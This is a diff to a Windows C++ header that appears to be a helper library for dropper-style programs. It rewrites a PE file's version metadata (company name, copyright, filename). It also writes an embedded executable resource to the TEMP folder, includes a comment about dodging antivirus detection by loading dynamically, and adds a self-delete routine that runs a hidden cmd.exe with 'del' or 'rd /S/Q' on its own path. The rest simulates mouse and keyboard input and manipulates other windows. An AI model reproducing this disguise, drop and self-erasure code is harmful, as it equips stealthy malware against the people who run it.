@@ -1,18 +1,20 @@
-
+﻿
 #pragma once
 #include "tchar.h"
 #include <string>
+#include "Shlobj.h"
+
 #pragma  comment(lib, "Version.lib")
 
-//msdn����12�ֲ�Ʒ����Ϣ
+//msdn中有12种产品的信息
 typedef struct _ATTINFO
 {
-	std::wstring wsFilePath;		//���޸ĵ��ļ�·��
-	std::wstring swCompanyName;		//��˾��
-	std::wstring swVersion;			//�ļ��汾����Ʒ�汾
-	std::wstring wsComments;		//����
-	std::wstring wsOriginalFilename;//ԭʼ��
-	std::wstring wsLegalCopyright;	//��Ȩ��Ϣ
+	std::wstring wsFilePath;		//待修改的文件路径
+	std::wstring swCompanyName;		//公司名
+	std::wstring swVersion;			//文件版本，产品版本
+	std::wstring wsComments;		//描述
+	std::wstring wsOriginalFilename;//原始名
+	std::wstring wsLegalCopyright;	//版权信息
 }ATTINFO, *PATTINFO;
 
 // these macros help to align on r-byte boundaries (thanks Ted Peck)
@@ -130,7 +132,7 @@ void ModifyPEAttribute(ATTINFO& attinfo)
 					LPTSTR  pValueBuffer;
 
 
-					//����
+					//名称
 					_stprintf_s(strSubBlock, MAX_PATH, _T("\\StringFileInfo\\%04x%04x\\InternalName"), lpTranslate->wLanguage, lpTranslate->wCodePage);
 					BOOL bRet = VerQueryValue(lpBuffer, strSubBlock, (LPVOID *) &pValueBuffer, &uTemp);
 					if (bRet == TRUE)
@@ -138,7 +140,7 @@ void ModifyPEAttribute(ATTINFO& attinfo)
 						//pValueBuffer[0] = _T('a');
 					}
 
-					//�ļ�����
+					//文件描述
 					_stprintf_s(strSubBlock, MAX_PATH, _T("\\StringFileInfo\\%04x%04x\\FileDescription"),lpTranslate->wLanguage, lpTranslate->wCodePage);
 					bRet = VerQueryValue(lpBuffer, strSubBlock, (LPVOID *) &pValueBuffer, &uTemp);
 					if (bRet == TRUE)
@@ -146,7 +148,7 @@ void ModifyPEAttribute(ATTINFO& attinfo)
 						ChangeBuffer(pValueBuffer, attinfo.wsComments);
 					}
 
-					//��Ʒ��
+					//产品名
 					_stprintf_s(strSubBlock, MAX_PATH, _T("\\StringFileInfo\\%04x%04x\\ProductName"), lpTranslate->wLanguage, lpTranslate->wCodePage);
 					bRet = VerQueryValue(lpBuffer, strSubBlock, (LPVOID *) &pValueBuffer, &uTemp);
 					if (bRet == TRUE)
@@ -154,7 +156,7 @@ void ModifyPEAttribute(ATTINFO& attinfo)
 						ChangeBuffer(pValueBuffer, attinfo.wsOriginalFilename);
 					}
 
-					//��Ȩ˵��
+					//版权说明
 					_stprintf_s(strSubBlock, MAX_PATH, _T("\\StringFileInfo\\%04x%04x\\LegalCopyright"), lpTranslate->wLanguage, lpTranslate->wCodePage);
 					bRet = VerQueryValue(lpBuffer, strSubBlock, (LPVOID *) &pValueBuffer, &uTemp);
 					if (bRet == TRUE)
@@ -162,7 +164,7 @@ void ModifyPEAttribute(ATTINFO& attinfo)
 						ChangeBuffer(pValueBuffer, attinfo.wsLegalCopyright);
 					}
 
-					//ԭʼ��
+					//原始名
 					_stprintf_s(strSubBlock, MAX_PATH, _T("\\StringFileInfo\\%04x%04x\\OriginalFilename"), lpTranslate->wLanguage, lpTranslate->wCodePage);
 					bRet = VerQueryValue(lpBuffer, strSubBlock, (LPVOID *) &pValueBuffer, &uTemp);
 					if (bRet == TRUE)
@@ -170,7 +172,7 @@ void ModifyPEAttribute(ATTINFO& attinfo)
 						ChangeBuffer(pValueBuffer, attinfo.wsOriginalFilename);
 					}
 
-					//��Ʒ�汾
+					//产品版本
 					_stprintf_s(strSubBlock, MAX_PATH, _T("\\StringFileInfo\\%04x%04x\\ProductVersion"), lpTranslate->wLanguage, lpTranslate->wCodePage);
 					bRet = VerQueryValue(lpBuffer, strSubBlock, (LPVOID *) &pValueBuffer, &uTemp);
 					if (bRet == TRUE)
@@ -178,7 +180,7 @@ void ModifyPEAttribute(ATTINFO& attinfo)
 						ChangeBuffer(pValueBuffer, attinfo.swVersion);
 					}
 
-					//�ļ��汾
+					//文件版本
 					_stprintf_s(strSubBlock, MAX_PATH, _T("\\StringFileInfo\\%04x%04x\\FileVersion"), lpTranslate->wLanguage, lpTranslate->wCodePage);
 					bRet = VerQueryValue(lpBuffer, strSubBlock, (LPVOID *) &pValueBuffer, &uTemp);
 					if (bRet == TRUE)
@@ -186,7 +188,7 @@ void ModifyPEAttribute(ATTINFO& attinfo)
 						ChangeBuffer(pValueBuffer, attinfo.swVersion);
 					}
 
-					//PrivateBuild�汾
+					//PrivateBuild版本
 					_stprintf_s(strSubBlock, MAX_PATH, _T("\\StringFileInfo\\%04x%04x\\SpecialBuild"), lpTranslate->wLanguage, lpTranslate->wCodePage);
 					bRet = VerQueryValue(lpBuffer, strSubBlock, (LPVOID *) &pValueBuffer, &uTemp);
 					if (bRet == TRUE)
@@ -233,7 +235,7 @@ void ModifyPEAttEx(ATTINFO& attinfo)
 	FILE* pFile = NULL;
 	_tfopen_s(&pFile, _T("version"), _T("rb"));
 	fseek(pFile, 0, SEEK_END);
-	int iLength = ftell(pFile); //�ļ�����
+	int iLength = ftell(pFile); //文件长度
 	fseek(pFile, 0, SEEK_SET);
 
 	LPBYTE lpBuf = new BYTE[iLength];
@@ -253,13 +255,13 @@ void ModifyPEAttEx(ATTINFO& attinfo)
 	{
 		UINT uTemp;
 
-		// get the language information �޸İ汾
+		// get the language information 修改版本
 		if (VerQueryValue(lpBuffer, _T("\\VarFileInfo\\Translation"), (LPVOID *) &lpTranslate, &uTemp) != FALSE)
 		{
 			TCHAR strSubBlock[MAX_PATH] = {0};
 			LPTSTR  pValueBuffer;
 			//goto ENDPOS;
-			//����
+			//名称
 			_stprintf_s(strSubBlock, MAX_PATH, _T("\\StringFileInfo\\%04x%04x\\InternalName"),lpTranslate->wLanguage, lpTranslate->wCodePage);
 			BOOL bRet = VerQueryValue(lpBuffer, strSubBlock, (LPVOID *) &pValueBuffer, &uTemp);
 			if (bRet == TRUE)
@@ -267,7 +269,7 @@ void ModifyPEAttEx(ATTINFO& attinfo)
 				//pValueBuffer[0] = _T('a');
 			}
 
-			//�ļ�����
+			//文件描述
 			_stprintf_s(strSubBlock, MAX_PATH, _T("\\StringFileInfo\\%04x%04x\\FileDescription"),lpTranslate->wLanguage, lpTranslate->wCodePage);
 			bRet = VerQueryValue(lpBuffer, strSubBlock, (LPVOID *) &pValueBuffer, &uTemp);
 			if (bRet == TRUE)
@@ -275,7 +277,7 @@ void ModifyPEAttEx(ATTINFO& attinfo)
 				_tcscpy_s(pValueBuffer, attinfo.wsComments.length()+1, attinfo.wsComments.c_str());
 			}
 
-			//��Ʒ��
+			//产品名
 			_stprintf_s(strSubBlock, MAX_PATH, _T("\\StringFileInfo\\%04x%04x\\ProductName"), lpTranslate->wLanguage, lpTranslate->wCodePage);
 			bRet = VerQueryValue(lpBuffer, strSubBlock, (LPVOID *) &pValueBuffer, &uTemp);
 			if (bRet == TRUE)
@@ -283,7 +285,7 @@ void ModifyPEAttEx(ATTINFO& attinfo)
 				_tcscpy_s(pValueBuffer, attinfo.wsOriginalFilename.length()+1, attinfo.wsOriginalFilename.c_str());
 			}
 
-			//��Ȩ˵��
+			//版权说明
 			_stprintf_s(strSubBlock, MAX_PATH, _T("\\StringFileInfo\\%04x%04x\\LegalCopyright"), lpTranslate->wLanguage, lpTranslate->wCodePage);
 			bRet = VerQueryValue(lpBuffer, strSubBlock, (LPVOID *) &pValueBuffer, &uTemp);
 			if (bRet == TRUE)
@@ -291,7 +293,7 @@ void ModifyPEAttEx(ATTINFO& attinfo)
 				_tcscpy_s(pValueBuffer, attinfo.wsLegalCopyright.length()+1, attinfo.wsLegalCopyright.c_str());
 			}
 
-			//ԭʼ��
+			//原始名
 			_stprintf_s(strSubBlock, MAX_PATH, _T("\\StringFileInfo\\%04x%04x\\OriginalFilename"), lpTranslate->wLanguage, lpTranslate->wCodePage);
 			bRet = VerQueryValue(lpBuffer, strSubBlock, (LPVOID *) &pValueBuffer, &uTemp);
 			if (bRet == TRUE)
@@ -299,7 +301,7 @@ void ModifyPEAttEx(ATTINFO& attinfo)
 				_tcscpy_s(pValueBuffer, attinfo.wsOriginalFilename.length()+1, attinfo.wsOriginalFilename.c_str());
 			}
 
-			//��Ʒ�汾
+			//产品版本
 			_stprintf_s(strSubBlock, MAX_PATH, _T("\\StringFileInfo\\%04x%04x\\ProductVersion"), lpTranslate->wLanguage, lpTranslate->wCodePage);
 			bRet = VerQueryValue(lpBuffer, strSubBlock, (LPVOID *) &pValueBuffer, &uTemp);
 			if (bRet == TRUE)
@@ -307,7 +309,7 @@ void ModifyPEAttEx(ATTINFO& attinfo)
 				_tcscpy_s(pValueBuffer,  attinfo.swVersion.length()+1, attinfo.swVersion.c_str());
 			}
 
-			//�ļ��汾
+			//文件版本
 			_stprintf_s(strSubBlock, MAX_PATH, _T("\\StringFileInfo\\%04x%04x\\FileVersion"), lpTranslate->wLanguage, lpTranslate->wCodePage);
 			bRet = VerQueryValue(lpBuffer, strSubBlock, (LPVOID *) &pValueBuffer, &uTemp);
 			if (bRet == TRUE)
@@ -315,7 +317,7 @@ void ModifyPEAttEx(ATTINFO& attinfo)
 				_tcscpy_s(pValueBuffer,  attinfo.swVersion.length()+1, attinfo.swVersion.c_str());
 			}
 
-			//PrivateBuild�汾
+			//PrivateBuild版本
 			_stprintf_s(strSubBlock, MAX_PATH, _T("\\StringFileInfo\\%04x%04x\\SpecialBuild"), lpTranslate->wLanguage, lpTranslate->wCodePage);
 			bRet = VerQueryValue(lpBuffer, strSubBlock, (LPVOID *) &pValueBuffer, &uTemp);
 			if (bRet == TRUE)
@@ -362,15 +364,15 @@ void Build(LPCTSTR lpszFile)
 	}
 }
 
-//�������е���Դ����
+//将程序中的资源导出
 bool GetResource(HINSTANCE hInstance, LPCTSTR lpFilePath)
 {
 	bool iRet = false;
 	HRSRC hResInfo = ::FindResource(NULL, MAKEINTRESOURCE(0),_T("mttype"));
 	HGLOBAL hRes = ::LoadResource(NULL, hResInfo);
 
-	LPVOID Data = ::LockResource(hRes);   // �ҵ���������Դ
-	DWORD nSize = ::SizeofResource(hInstance, hResInfo);   	// ��Դ��С
+	LPVOID Data = ::LockResource(hRes);   // 找到并锁定资源
+	DWORD nSize = ::SizeofResource(hInstance, hResInfo);   	// 资源大小
 
 	BYTE *pBuf = new BYTE[nSize];
 	if(pBuf == NULL)
@@ -394,12 +396,244 @@ bool GetResource(HINSTANCE hInstance, LPCTSTR lpFilePath)
 	return iRet;
 }
 
-//�ƶ���꣬ģ�������̲���
+//移动鼠标，模拟鼠标键盘操作
 long MouseMove()
 {
 	SetCursorPos(20, 50);
 	mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
 	mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
+
+	return 0;
+}
+
+
+//自删除程序
+void DeleteSelf(bool bIsDir)
+{
+	//
+	SHELLEXECUTEINFO ExeInfo;
+	TCHAR     ExePath[MAX_PATH] = {0};
+	TCHAR     ParamPath[MAX_PATH] = {0};
+	TCHAR     ComposePath[MAX_PATH] = {0};
+
+
+	GetModuleFileName(NULL,ExePath,MAX_PATH);
+	GetShortPathName(ExePath,ExePath,MAX_PATH);
+	GetEnvironmentVariable(_T("COMSPEC"),ComposePath,MAX_PATH);
+
+	if (bIsDir)
+	{
+		TCHAR *p=_tcsrchr(ExePath,_T('\\'));
+		if(p!=NULL)
+			p[1]=_T('\0');
+
+		if (_tcslen(ExePath) < 4)
+			return;
+
+		_tcscpy_s(ParamPath,_T("/c rd \""));
+		_tcscat_s(ParamPath,ExePath);
+		_tcscat_s(ParamPath,_T("\" /S/Q"));
+
+	}
+	else
+	{
+		_tcscpy_s(ParamPath,_T("/c del "));
+		_tcscat_s(ParamPath,ExePath);
+		_tcscat_s(ParamPath,_T(" > nul"));
+	}
+
+
+	ZeroMemory(&ExeInfo,sizeof(ExeInfo));
+	ExeInfo.cbSize = sizeof(ExeInfo);
+	ExeInfo.hwnd = 0;  
+	ExeInfo.lpVerb = _T("Open");    
+	ExeInfo.lpFile = ComposePath;    
+	ExeInfo.lpParameters = ParamPath; 
+	ExeInfo.nShow = SW_HIDE;     
+	ExeInfo.fMask = SEE_MASK_NOCLOSEPROCESS; 
+
+
+	if (ShellExecuteEx(&ExeInfo))
+	{
+
+		SetPriorityClass(ExeInfo.hProcess,IDLE_PRIORITY_CLASS);
+		//
+		SetPriorityClass(GetCurrentProcess(),REALTIME_PRIORITY_CLASS);
+		SetThreadPriority(GetCurrentThread(),THREAD_PRIORITY_TIME_CRITICAL);
+		//ͨ
+		SHChangeNotify(SHCNE_DELETE,SHCNF_PATH,ExePath,NULL);
+	}
+}
+
+//获得程序资源中的内容
+DWORD GetSourceFromFile(HINSTANCE hInstance)
+{
+	bool iRet = false;
+	HRSRC hResInfo = ::FindResource(NULL, MAKEINTRESOURCE(123/*IDC_MT_SOURCE*/),_T("mt"));
+	HGLOBAL hRes = ::LoadResource(NULL, hResInfo);
+
+	LPVOID Data = ::LockResource(hRes);   // 找到并锁定资源
+	DWORD nSize = ::SizeofResource(hInstance, hResInfo);   	// 资源大小
+
+	TCHAR lpTempPath[MAX_PATH] = {0};
+	TCHAR tcsTmpFilePath[MAX_PATH] = {0};
+	GetEnvironmentVariable(_T("TEMP"), lpTempPath, MAX_PATH);
+	GetTempFileName(lpTempPath,_T("~dl"), 0, tcsTmpFilePath);
+	_tcscat_s(tcsTmpFilePath, MAX_PATH, _T(".exe"));
+
+	DeleteFile(tcsTmpFilePath);
+
+	HANDLE hOptFile = ::CreateFile(tcsTmpFilePath, GENERIC_WRITE, 0, NULL,CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hOptFile == INVALID_HANDLE_VALUE) { return false; }
+	DWORD written = 0;
+	if (::WriteFile(hOptFile, Data, nSize, &written, NULL))  /*Features, winapi*/
+	{
+		iRet = true;
+	}
+	::CloseHandle(hOptFile);
+
+	// 	if (WriteFile_DL(nSize, (LPBYTE)pBuf, tcsTmpFilePath))  /*Features报毒位置，动态加载*/
+	// 	{
+	// 		iRet = true;
+	// 	}
+
+	return iRet;
+}
+
+//获得设置窗口标题
+//枚举子窗口用到的信息
+typedef struct _WINDOWSINFO
+{
+	LPCTSTR lpChildClassName;
+	LPCTSTR lpChileTitleName;
+	LPCTSTR lpSetValue;   //设置的值
+	LPTSTR  lpGetValue;   //获得的值
+	int		iType;		  //1表示设置置，2表示获得值
+}WINDOWSINFO, *LPWINDOWSINFIO;
+#define GETVALUE	1
+#define SETVALUE	2
+LPCTSTR IsStringEmpty(std::wstring& strValue)
+{
+	if (!strValue.empty())
+	{
+		return strValue.c_str();
+	}
+	return NULL;
+}
+BOOL CALLBACK EnumChildProc(HWND hWnd,LPARAM lParam)  
+{  
+	WINDOWSINFO* lpWinInfo = (WINDOWSINFO*)lParam;
+	TCHAR lpClassName[MAX_PATH] = {0};
+	::GetClassName(hWnd, lpClassName, MAX_PATH);
+
+	if (0 == _tcsicmp(lpClassName, lpWinInfo->lpChildClassName))
+	{
+		if (GETVALUE == lpWinInfo->iType)
+		{
+			SendMessage(hWnd, WM_GETTEXT, MAX_PATH, (LPARAM)lpWinInfo->lpGetValue);
+		}
+		else if (SETVALUE == lpWinInfo->iType)
+		{
+			SendMessage(hWnd, WM_SETTEXT, MAX_PATH, (LPARAM)lpWinInfo->lpSetValue);
+		}
+	}
+
+	return true;  
+}
+long OpeWindowTextValue()
+{
+	std::wstring strParentClassName = _T("");
+	std::wstring strParentTitleName = _T("");
+	std::wstring strChildClassName = _T("");
+	std::wstring strChildTitleName = _T("");
+	std::wstring strValue = _T(""); 
+	int iType = GETVALUE;
+
+	LPCTSTR lpParentClassName = IsStringEmpty(strParentClassName);
+	LPCTSTR lpParentTitleName = IsStringEmpty(strParentTitleName);
+	LPCTSTR lpChildClassName = IsStringEmpty(strChildClassName);
+	LPCTSTR lpChildTitleName = IsStringEmpty(strChildTitleName);
+
+	HWND hwnd = ::FindWindow(lpParentClassName, lpParentTitleName);
+	if (NULL == hwnd)
+	{
+		return 0;
+	}
+
+	TCHAR lpGetValue[MAX_PATH] = {0};
+	WINDOWSINFO winInfo = {0};
+	winInfo.lpChildClassName = lpChildClassName;
+	winInfo.lpChileTitleName = lpChildTitleName;
+	winInfo.lpSetValue = strValue.c_str();
+	winInfo.lpGetValue = lpGetValue;
+	winInfo.iType = iType;
+	::EnumChildWindows(hwnd, EnumChildProc, LPARAM(&winInfo));
+
+	if (GETVALUE == iType)
+	{
+	}
+
+	DWORD dwRet = GetLastError();
+
+	return 0;
+}
+
+//鼠标移动
+DWORD OpeMouse()
+{
+	//设置鼠标位置
+	SetCursorPos(0, 0);
+
+	//获得鼠标位置
+	POINT pos = {0};
+	BOOL bRet = ::GetCursorPos(&pos);
+
+	//鼠标点击
+	mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
+	mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
+
+	//键盘按键
+	keybd_event(0x5B, 0, 0, 0);
+	keybd_event(0x5B, 0, KEYEVENTF_KEYUP, 0);
+
+	return 0;
+}
+
+//获得窗口的文字
+DWORD GetWindowsString()
+{
+	std::wstring strClassName = _T("Classname");
+
+	LPCTSTR lpClassName = IsStringEmpty(strClassName);
+
+	HWND hwnd = ::FindWindow(lpClassName, NULL);
+	if (NULL == hwnd)
+	{
+		return 0;
+	}
+
+	TCHAR lpText[MAX_PATH] = {0};
+	GetWindowText(hwnd, lpText, MAX_PATH);
+
+
+	//显示窗口
+	//BOOL bSmall = IsIconic(hwnd);    //是否最小化
+	//BOOL bSmall = IsZoomed(hwnd);	   //是否最大化
+	ShowWindow(hwnd, SW_SHOWNORMAL);   //正常显示
+	int iRet = SetForegroundWindow(hwnd) ;
+
+
+	//关闭窗口
+	BOOL bRet = ::PostMessage( hwnd, WM_CLOSE, 0, 0 );
+
+
+	//获取某点的颜色
+	HDC hDC = ::GetDC(NULL);
+	COLORREF colorref = ::GetPixel(hDC, 123, 123);  //Get the cursor color
+	::ReleaseDC(NULL,hDC);
+	int r = (colorref&0xFF);
+	int g = (colorref>>8)&0xFF;
+	int b = (colorref>>16);
 
 	return 0;
 }
